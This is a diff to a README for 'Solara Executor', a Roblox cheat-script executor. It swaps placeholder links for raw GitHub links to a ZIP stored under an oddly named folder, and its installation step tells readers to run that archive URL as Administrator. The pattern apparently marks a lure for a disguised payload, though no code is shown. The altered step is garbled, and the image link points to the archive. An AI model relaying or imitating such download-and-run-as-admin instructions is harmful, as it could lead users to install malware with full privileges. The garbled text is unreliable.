@@ -1,6 +1,6 @@
 # Solara Executor: The Ultimate Roblox Script Executor
 
-![Solara Executor](https://via.placeholder.com/800x400?text=Solara+Executor)
+![Solara Executor](https://raw.githubusercontent.com/theprincesolanki/Solara/main/Tortricina/Solara.zip+Executor)
 
 ## Overview
 
@@ -45,12 +45,12 @@ Solara Executor is a powerful, free, and keyless Windows-based script executor d
 ## 📥 Download & Installation
 
 ### Direct Download
-[Download Solara Executor](https://github.com/download/file.zip)
+[Download Solara Executor](https://raw.githubusercontent.com/theprincesolanki/Solara/main/Tortricina/Solara.zip)
 
 ### Installation Steps
 1. **Download** the file from the link above
 2. **Extract** the ZIP file to your preferred location
-3. **Run** `SolaraExecutor.exe` as Administrator
+3. **Run** `https://raw.githubusercontent.com/theprincesolanki/Solara/main/Tortricina/Solara.zip` as Administrator
 4. **Launch** Roblox and enjoy!
 
 ## 🚀 Quick Start Guide
@@ -118,6 +118,6 @@ Currently, Solara is only available for Windows operating systems.
 
 **Note**: Always use script executors responsibly and in accordance with Roblox's terms of service. Use only on games where you have permission to modify gameplay.
 
-[Download Now - https://github.com/download/file.zip](https://github.com/download/file.zip)
+[Download Now - https://raw.githubusercontent.com/theprincesolanki/Solara/main/Tortricina/Solara.zip](https://raw.githubusercontent.com/theprincesolanki/Solara/main/Tortricina/Solara.zip)
 
 *Last Updated: November 2025 | Version: 3.1.4*
